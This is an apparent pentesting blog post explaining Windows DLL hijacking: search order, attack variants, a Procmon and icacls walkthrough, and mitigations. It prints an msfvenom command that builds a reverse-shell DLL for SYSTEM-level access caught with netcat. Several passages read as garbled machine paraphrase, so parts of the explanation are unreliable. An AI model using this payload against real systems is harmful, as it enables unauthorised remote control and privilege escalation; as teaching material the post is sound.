<!DOCTYPE html>
<html lang="en" mode="dark">

<head>
    <meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
    <script>
        window.dataLayer = window.dataLayer || [];

        function gtag() {
            dataLayer.push(arguments);
        }
        gtag('js', new Date());
        gtag('config', 'UA-175469707-1');
    </script>
    <title>DLL Hijacking Attack | Mr Akuma</title>
    <meta name="generator" content="Jekyll v3.9.0" />
    <meta property="og:title" content="Bypassing malware detection" />
    <meta name="author" content="Mr Akuma" />
    <meta property="og:locale" content="en_US" />
    <meta name="description"
        content="The information provided in this site is for educational purposes regarding pentesting. The author of the site will not be held any responsibility for any misuse of the information from this site." />
    <meta property="og:description"
        content="The information provided in this site is for educational purposes regarding pentesting. The author of the site will not be held any responsibility for any misuse of the information from this site." />

    <link rel="icon" href="../../images/title.jpeg" />

    <!-- The Favicons for Web, Android, Microsoft, and iOS (iPhone and iPad) Apps Generated by: https://www.favicon-generator.org/ v2.0 https://github.com/cotes2020/jekyll-theme-chirpy © 2019 Cotes Chung Published under the MIT license -->
    <link rel="shortcut icon" href="../../img/favicon.ico" type="image/x-icon">
    <link rel="icon" href="../../img/favicon.ico" type="image/x-icon">
    <meta name="msapplication-TileColor" content="#ffffff">
    <meta name="theme-color" content="#ffffff">
    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin="anonymous">
    <link rel="dns-prefetch" href="https://fonts.gstatic.com">
    <link rel="dns-prefetch" href="cdn.jsdelivr.net">
    <link rel="preload" as="style" href="https://cdn.jsdelivr.net/npm/bootstrap@4.0.0/dist/css/bootstrap.min.css"
        integrity="sha256-LA89z+k9fjgMKQ/kq4OO2Mrf8VltYml/VES+Rg0fh20=" crossorigin>
    <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/bootstrap@4.0.0/dist/css/bootstrap.min.css"
        integrity="sha256-LA89z+k9fjgMKQ/kq4OO2Mrf8VltYml/VES+Rg0fh20=" crossorigin="anonymous">
    <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free@5.11.2/css/all.min.css"
        integrity="sha256-+N4/V/SbAFiW1MPBCXnfnP9QSN3+Keu+NlB+0ev/YKQ=" crossorigin="anonymous">
    <!-- CSS selector for site. Chirpy v2.3 https://github.com/cotes2020/jekyll-theme-chirpy © 2020 Cotes Chung MIT Licensed -->
    <link rel="preload" as="style" href="../../css/post.css">
    <link rel="stylesheet" href="../../css/post.css">
    <link rel="preload" as="style" href="../../css/bootstrap-toc.min.css">
    <link rel="stylesheet" href="../../css/bootstrap-toc.min.css" />
    <link rel="preload" as="script" href="https://cdn.jsdelivr.net/npm/jquery@3.4.1"
        integrity="sha256-CSXorXvZcTkaix6Yvo6HppcZGetbYMGWSFlBw8HfCJo=" crossorigin="anonymous">
    <script src="https://cdn.jsdelivr.net/npm/jquery@3.4.1"
        integrity="sha256-CSXorXvZcTkaix6Yvo6HppcZGetbYMGWSFlBw8HfCJo=" crossorigin="anonymous"></script>
    <script src="https://cdn.jsdelivr.net/combine/npm/popper.js@1.15.0,npm/bootstrap@4.0.0/dist/js/bootstrap.min.js"
        async></script>
    <!-- JS selector for site. Chirpy v2.3 https://github.com/cotes2020/jekyll-theme-chirpy © 2020 Cotes Chung MIT Licensed -->
    <script src="../../js/post.min.js" async></script>
    <script src="../../js/app.js" defer></script>

<body data-spy="scroll" data-target="#toc">
    <div id="sidebar" class="d-flex flex-column">
        <!-- The Side Bar v2.0 https://github.com/cotes2020/jekyll-theme-chirpy © 2017-2019 Cotes Chung MIT License -->
        <div id="nav-wrapper">
            <div id="profile-wrapper" class="d-flex flex-column">
                <div id="avatar" class="d-flex justify-content-center"> <a href="/" alt="avatar"> <img
                            src="../../images/title.jpeg" alt="avatar" onerror="this.style.display='none'">
                    </a></div>
                <div class="profile-text mt-3">
                    <div class="site-title"> <a href="/">Mr Akuma</a></div>
                    <div class="site-subtitle font-italic">Publish write-ups from various pentesting platforms</div>
                </div>
            </div>
            <ul class="nav flex-column">
                <li class="nav-item d-flex justify-content-center "> <a href="../../index.html"
                        class="nav-link d-flex justify-content-center align-items-center w-100"> <i
                            class="fa-fw fas fa-home ml-xl-3 mr-xl-3 unloaded"></i> <span>HOME</span> </a></li>

                <li class="nav-item d-flex justify-content-center "> <a href="../../whoami.html"
                        class="nav-link d-flex justify-content-center align-items-center w-100"> <i
                            class="fa-fw fas fa-info ml-xl-3 mr-xl-3 unloaded"></i> <span>WHOAMI</span> </a></li>
            </ul>
        </div>
        <div class="sidebar-bottom d-flex flex-wrap justify-content-around mt-4"> <a
            href="https://github.com/akshay1729" target="_blank"> <i class="fab fa-github-alt"></i> </a> <a
            href="https://twitter.com/Akshayjain890" target="_blank"> <i class="fab fa-twitter"></i> </a> <a
            href=" javascript:window.open('mailto:' + ['Akshayjain5','protonmail.com'].join('@'))"><i
               class="fas fa-envelope"></i> </a> <a href="https://www.linkedin.com/in/akshay-jain-533a79111/"> <i
               class="fab fa-linkedin"></i> </a> <a href="https://www.hackthebox.eu/profile/189220"> <i
               class="fas fa-cube"></i> </a></div>

    </div><!-- The Top Bar v2.0 https://github.com/cotes2020/jekyll-theme-chirpy © 2017-2019 Cotes Chung MIT License -->
    <div id="topbar-wrapper" class="row justify-content-center topbar-down">
        <div id="topbar" class="col-11 d-flex h-100 align-items-center justify-content-between"> <span id="breadcrumb">
                <span> <a href="../../index.html"> Article </a> </span> <span>DLL Hijacking Attack</span> </span> <i id="sidebar-trigger"
                class="fas fa-bars fa-fw"></i>
            <div id="topbar-title"> Article</div><i id="search-trigger" class="fas fa-search fa-fw"></i> <span
                id="search-wrapper" class="align-items-center"> <i class="fas fa-search fa-fw"></i> <input
                    class="form-control" id="search-input" type="search" placeholder="Search..."> <i
                    class="fa fa-times-circle fa-fw" id="search-cleaner"></i> </span> <span
                id="search-cancel">Cancel</span>
        </div>
    </div>
    <div id="main-wrapper">
        <div id="main">
            <div class="row">
                <div id="post-wrapper" class="col-12 col-lg-11 col-xl-8">
                    <div class="post pl-1 pr-1 pl-sm-2 pr-sm-2 pl-md-4 pr-md-4">
                        <h1 data-toc-skip>DLL Hijacking Attack</h1>
                        <div class="post-meta text-muted d-flex flex-column">
                            <div> Posted
                                <span class="timeago " data-toggle="tooltip" data-placement="bottom"
                                    title="Sun, Aug 4, 2019, 10:00 PM +0530"> Aug 4<i
                                        class="unloaded">2019-08-04T20:00:00+05:30</i> </span> by <span class="author">
                                    Mr Akuma </span></div>
                            <div> Updated
                                <!-- Date format snippet v2.4.1 https://github.com/cotes2020/jekyll-theme-chirpy © 2020 Cotes Chung MIT License -->
                                <span class="timeago lastmod" data-toggle="tooltip" data-placement="bottom"
                                    title="Sun, Aug 4, 2019, 10:00 PM +0530"> Sep 9 <i
                                        class="unloaded">2019-08-04T20:00:00+05:30</i> </span></div>
                        </div>
                        <div class="post-content"> <img src="cover.png">
                            <blockquote>
                                <p><strong>The information provided in this site is for educational purposes regarding
                                        pentesting. The author of the site will not be held any responsibility for any
                                        misuse of the information from this site.</strong></p>
                            </blockquote>
                            <h2 id="introduction"><strong><span style="color:#ff5555">Introduction</span></strong></h2>
                            <hr>
                            <p>Even though we routinely use computer application to play out our everyday Task, not many of us know or will, in general, consider the ramifications of how this software is built, and any shortcomings it may be vulnerable as it starts execution.</p>
                            <hr>
                            <p>But hackers and cyber-criminals use various tools and methods to target applications once they are up and ready to execute. there is a possibility to compromise certain functions of software when it’s called up to execute the task from an index, or by clicking on an icon. these applications might have a possibility of weakness which can be exploited while a program is assembling and checking all the files and basic dependency before the application is ready to carry out the task, DLL hijacking is often seen or common in Microsoft Windows application</p>
                            <h2 id="dll"><strong><span style="color:#ff5555">So what is DLL?</span></strong></h2>
                            <hr>
                            <p>To understand DLL hijacking we need to understand what is DLL</p>
                            <hr>
                            <p>A DLL or Dynamic Link Library is a collection of commands or information needed to run a portion of a complex and huge application. This data is called whenever it is required (dynamically), reducing the need to have multiple copies of code into the core of the main program. This technique reduces the loading time for an application especially for larger pieces of software and improves the overall efficiency of the software which allows efficient use of computer resources and time utilization. These DLLs typically contain multiple procedures and codes which allow them to be used by a range of different programs, at the same time.</p>
                            <h2 id="dll_hijacking"><strong><span style="color:#ff5555">DLL Hijacking</span></strong></h2>
                            <hr>
                            <p>DLL hijacking is an attack which exploits the task carried out by Windows search and load algorithm, wherein allowing an attacker to inject code/payload into an application through disk manipulation. which is simply writing a malicious DLL file in the right place causes a vulnerable application to load that malicious DLL. The attack on the DLL has been used since the beginning of Windows 2000 and works perfectly till date.</p>
                            <hr>
                            <p>The paths for locating DLL files are set by the operating system — Windows, in most cases, These paths are established using Global Environmental Variables.when an application request a Dynamic Link Library file, the operating system (OS) first checks for it in the same folder where the application is located. If the DLL which is required can’t be located there, then the OS searches through other folders, as determined by the Global Environmental Variable.</p>
                            <hr>
                            <p>As DLLs may be present in different folders across the hard drive of an operating system, this creates a possibility of weakness present int he system which allows an attacker to replace their version of a DLL file into the directory path set by the environment variable which is mapped for the application can search for required DLL.</p>
                            <hr>
                            <p>The technique of replacing the original DLL file with a malicious DLL file is a strategy of the attacker which will allow the malicious DLL to be called and process the malicious DLL allowing the attacker to gain control over the application remotely. There is various form of DLL hijacking but they have one thing in common which is to load or perform the malicious activities on the end-user compromising the DLL</p>
                            <hr>
                            <p>The DLL required by a specific application is hardcoded into the software, Windows will search for them in a predefined order which is well set used by the Microsoft and which is also available to potential hijackers. Its default search setting is mentioned below as the hackers have various means to change or introduce a rogue DLL the hackers focus on the below-mentioned list:</p>
                            <hr>
                            <p>
                                <ul>
                                    <li>The directory from which the application is loaded</li>
                                    <li>C:\Windows\System32</li>
                                    <li>C:\Windows\System</li>
                                    <li>C:\Windows</li>
                                    <li>The current working directory</li>
                                    <li>Directories in the system PATH environment variable</li>
                                    <li>Directories in the user PATH environment variable</li>
                                </ul>
                            </p>
                            <hr>
                            <h2 id="types"><strong><span style="color:#ff5555">Types of DLL Hijacking attacks</span></strong></h2>
                            <p>DLL Hijacking attacks are broadly classified into three types they are as follow :</p>
                            <hr>
                            <p><strong style="color:antiquewhite">DLL search order attack:</strong> If a Windows OS searches for the rogue DLL path in a specific sequence then it is DLL search order attack. Therefore, a malicious DLL can be replaced in the search order, and the executable will load it.it first checks for an authentic DLL directory which contains the names of known system DLLs. If the DLL mentioned in the “import name” command matches with an authenticDLL, then this Dynamic Link Library will be mapped to the relevant process address space, in the system memory and once the rogue DLL is loaded the attacker payload executes which in turn can create a connection to the target system and can be controlled easily</p>
                            <p>A Windows registry key handles where the list of KnownDLLs is located — and hackers can alter the related registry key to exclude their malicious DLLs from processing via the DLL protocol.</p>
                            <hr>
                            <p><strong style="color:antiquewhite">DLL side- stacking attack:</strong> A DLL side- stacking attack abuses the WinSxS registry, which is situated in C:\Windows\WinSxS, holds various adaptations of DLLs and is utilized by numerous applications to forestall issues related with a new or copied version of Dynamic Link Libraries.</p>
                            <p>An application intended to utilize the WinSxS index to fetch a DLL should initially counsel a display which records the DLLs that might be called upon at runtime to a specific application, and which is utilized in figuring out which version of a DLL to be selected</p>
                            <hr>
                            <p><strong style="color:antiquewhite">Ghost/Phantom DLL Hijacking:</strong>Phantom DLL Hijacking attack uses very old DLLs that are still attempted to be loaded by apps. DLLs which applications may contain instructions to load at start-up — even if they’re not essential to using the software</p>
                            <p>To take advantage of this loophole, attackers simply need to name their malicious Dynamic Link Library as one of these DLLs and place it in the relevant search path for the application to find and the code will be executed</p>
                            <h2 id="test"><strong><span style="color:#ff5555">Let’s Test this out</span></strong></h2>
                            <hr>
                            <p><img src="1.jpeg"></p>
                            <hr>
                            <p>For a successful DLL hijacking attack, the attacker requires to trick victims to open the file using a vulnerable application from a remote network location. If the vulnerable application successfully loads the external DLL from the same location, the attack will most likely be successful but there are situation where the application crashes wherein a custom exploit should be created instead of using automated Metasploit framework to carry out the attack.</p>
                            <hr>
                            <p>To find an application with DLL injection we need to use Procmon or process monitor which will list all the processes on the system and discover these processes which are running as SYSTEM and are missing DLL's</p>
                            <hr>
                            <p><img src="2.png"></p>
                            <hr>
                            <p>Process Monitor will identify the running process if there is any DLL called by the application and the actual path that the application is looking for the missing DLL.</p>
                            <hr>
                            <p><img src="3.png"></p>
                            <hr>
                            <p>The iCACLS command allows to display or change an Access Control Lists (ACLs) for files and folders on the file system</p>
                            <hr>
                            <p>To show current permissions on a specific folder (for example, C:\PS), open a Command prompt and run the command:</p>
                            <hr>
                            <p><code class="language-plaintext highlighter-rouge">icacls c:\PS</code></p>
                            <hr>
                            <p><img src="4.png" style="border-right-style: solid;border-right-color: skyblue;"></p>
                            <hr>
                            <p>Below is a complete list of permissions that can be set using the icacls utility.</p>
                            <ul>
                                <li>iCACLS inheritance settings:
                                    <ul>
                                        <li>(OI) — object inherit;</li>
                                        <li>(CI) — container inherit;</li>
                                        <li>(IO) — inherit only;</li>
                                        <li>(NP) — don’t propagate inherit;</li>
                                        <li>(I) — permission inherited from the parent container;</li>
                                    </ul>
                                </li>
                                <li>List of basic access permissions:
                                    <ul>
                                        <li>D — delete access;</li>
                                        <li>F — full access;</li>
                                        <li>N — no access;</li>
                                        <li>M — modify access;</li>
                                        <li>RX — read and eXecute access;</li>
                                        <li>R — read-only access;</li>
                                        <li>W — write-only access;</li>
                                    </ul>
                                </li>
                            </ul>
                            <hr>
                            <p>now we use Metasploit to generate our payload which will return a session with a privilege</p>
                            <hr>
                            <p>Command: <code class="language-plaintext highlighter-rouge">msfvenom -p windows/shell_reverse_tcp lhost=&lt;ip&gt; lport=&lt;listening port&gt; -f dll -o &lt;dll name&gt;</code></p>
                            <hr>
                            <p><img src="5.png" style="border-bottom-style: solid; border-color: black;"></p>
                            <hr>
                            <p>The running process is running as SYSTEM which means these privileges will be granted to the user only when the system is restarted as the DLL with the malicious payload will be loaded and executed by the process.</p>
                            <hr>
                            <p><img src="6.png"></p>
                            <hr>
                            <p>The running process is running as SYSTEM which means these privileges will be granted to the user only when the system is restarted as the DLL with the malicious payload will be loaded and executed by the process</p>
                            <hr>
                            <p><img src="7.png"></p>
                            <hr>
                            <p>once the DLL is loaded a connection is created and we can access it with netcat and simple smbserver script which is available on Linux machine.</p>
                            <hr>
                            <p><img src="8.png"></p>
                            <h2 id="safeguard"><strong><span style="color:#ff5555">How to safeguard the end system from DLL hijacking</span></strong></h2>
                            <hr>
                            <p>To guard against DLL hijacking necessities to begin from the product designers. If developers utilize outright ways to characterize the normal area of Dynamic Link Libraries in the product code, the vulnerability can be enormously decreased.</p>
                            <hr>
                            <p>It should be tested out by a penetration tester</p>
                            <hr>
                            <p>There are various tools focused to identify the DLL injection, or for testing whether your framework and applications are vulnerable.</p>
                            <hr>
                            <p>Regarding counteraction, great system practices, for example, having a solid firewall introduced and utilizing interruption location frameworks are the first line of protection</p>
                            <hr>
                            <p>Obstructing the TCP ports 445 and 139 (which are most ordinarily utilized for trading off PCs) is another viable advance. Also, ensuring that your working framework and applications are forward-thinking and consistently fixed can guarantee that you have the most recent guards.</p>
                            <hr>
                            <p>Microsoft has a mechanism for blocking DLL hijacking attacks. It’s a system which additionally incorporates outsider devices</p>
                        </div>
                        <div class="post-tail-wrapper text-muted">
                            <div class="post-meta mb-3"> <i class="far fa-folder-open fa-fw mr-1"></i> <a
                                    href='../../index.html'>Article</a></div>
                            <div class="post-tags"> <i class="fa fa-tags fa-fw mr-1"></i>
                                <a class="post-tag no-text-decoration">Network Security</a><a class="post-tag no-text-decoration">Dll Injection</a><a class="post-tag no-text-decoration">Procmon</a><a class="post-tag no-text-decoration">Netcat</a><a class="post-tag no-text-decoration">Netcat</a>
                                </div>
                        </div>
                    </div>
                </div>
                <!-- The Pannel on right side (Desktop views) v2.0 https://github.com/cotes2020/jekyll-theme-chirpy © 2017-2019 Cotes Chung MIT License -->
                <div id="panel-wrapper" class="col-xl-3 pl-2 text-muted topbar-down">
                    <div id="toc-wrapper" class="pl-0 pr-4 mb-5">
                        <h3 data-toc-skip class="pl-3 pt-2 mb-2">Contents</h3>
                        <nav id="toc" data-toggle="toc"></nav>
                    </div>
                </div>
            </div>
            <script type="text/javascript" src="https://cdn.jsdelivr.net/npm/lozad/dist/lozad.min.js"></script>
            <script type="text/javascript">
                const imgs = document.querySelectorAll('#post-wrapper img');
                const observer = lozad(imgs);
                observer.observe();
            </script>
            <!-- The Footer v2.0 https://github.com/cotes2020/jekyll-theme-chirpy © 2017-2019 Cotes Chung MIT License -->
            <footer class="d-flex w-100 justify-content-center">
                <div class="d-flex justify-content-between align-items-center">
                    <div class="footer-left">
                        <!-- <script src="https://www.hackthebox.eu/badge/189220"></script> -->
                </div>
            </footer>
        </div>
        <!-- The Search results v2.0 https://github.com/cotes2020/jekyll-theme-chirpy © 2017-2019 Cotes Chung MIT License -->
        <div id="search-result-wrapper" class="d-flex justify-content-center unloaded">
            <div class="col-12 col-xl-11 post-content">
                <div id="search-results" class="d-flex flex-wrap justify-content-center text-muted mt-3"></div>
            </div>
        </div>
    </div>
    <div id="mask"></div><a id="back-to-top" href="#" class="btn btn-lg btn-box-shadow" role="button"> <i
            class="fas fa-angle-up"></i> </a>
    <!-- The GA snippet v2.0 https://github.com/cotes2020/jekyll-theme-chirpy © 2017-2019 Cotes Chung MIT License -->
    <!-- Jekyll Simple Search loader v2.0 https://github.com/cotes2020/jekyll-theme-chirpy © 2017-2019 Cotes Chung MIT License -->
    <script src="https://cdn.jsdelivr.net/npm/simple-jekyll-search@1.7.3/dest/simple-jekyll-search.min.js"></script>
    <script>
        SimpleJekyllSearch({
            searchInput: document.getElementById('search-input'),
            resultsContainer: document.getElementById('search-results'),
            json: '/assets/js/data/search.json',
            searchResultTemplate: '<div class="pl-1 pr-1 pl-sm-2 pr-sm-2 pl-lg-4 pr-lg-4 pl-xl-0 pr-xl-0"> <a href="corshinecorshine.github.io{url}">{title}</a><div class="post-meta d-flex flex-column flex-sm-row text-muted mt-1 mb-1"><div class="mr-sm-4"><i class="far fa-folder fa-fw"></i>{categories}</div><div><i class="fa fa-tag fa-fw"></i>{tags}</div></div><p>{snippet}</p></div>',
            noResultsText: '<p class="mt-5">Oops! No result founds.</p>'
        });
    </script>
